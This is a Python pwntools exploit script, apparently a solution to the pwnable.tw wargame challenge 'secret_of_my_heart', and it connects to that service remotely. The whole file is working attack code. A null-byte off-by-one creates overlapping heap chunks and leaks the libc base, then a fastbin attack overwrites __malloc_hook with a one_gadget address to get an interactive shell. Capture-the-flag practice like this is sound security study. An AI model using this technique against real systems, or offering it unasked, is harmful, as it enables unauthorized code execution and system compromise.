#coding:utf-8
import sys
from pwn import *
from ctypes import *
context.log_level='debug'
elfelf='./secret_of_my_heart'
#context.arch='amd64'
while True :
	# try :
		clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.23.so')
		if len(sys.argv)==1 :
			io=process(elfelf)
			clibc.srand(clibc.time(0))
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('chall.pwnable.tw',10302)
			clibc.srand(clibc.time(0))
			elf=ELF(elfelf)
			# libc=ELF('./libc_64.so.6')
			libc=ELF('../../x64libc/libc-2.23.so')
			# libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			# one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]



		def add(a,b,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter(':',str(a))
			io.sendafter(':',b)
			io.sendafter(':',c)

		def show(a):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter(':',str(a))

		def delete(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter(':',str(a))

		v2=0
		while v2 <=0x10000 :
			v2 = clibc.rand() & 0xFFFFF000
		add(0xf8,p64(0x41)*4,'bbbb')
		add(0x68,p64(0x41)*4,'bbbb')
		add(0x88,p64(0x41)*4,'bbbb')
		add(0xf8,p64(0x41)*4,'bbbb')
		add(0xf8,p64(0x41)*4,'bbbb')
		delete(2)
		add(0x88,p64(0x41)*4,'\x00'*0x80+p64(0x200))
		delete(0)
		delete(3)
		delete(1)
		add(0xd8,p64(0x41)*4,'bbbb')
		add(0x88,p64(0x41)*4,'bbbb')
		show(2)

		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']

		# delete(0)
		delete(1)
		add(0x88,p64(0x41)*4,'\x00'*0x18+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23)+'a'*0x60)
		add(0x68,'aaaa','aaaa')
		add(0x68,'aaaa','\x00'*0x13+p64(libc_base+one_gadgaet[2]))
		delete(2)

		
		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue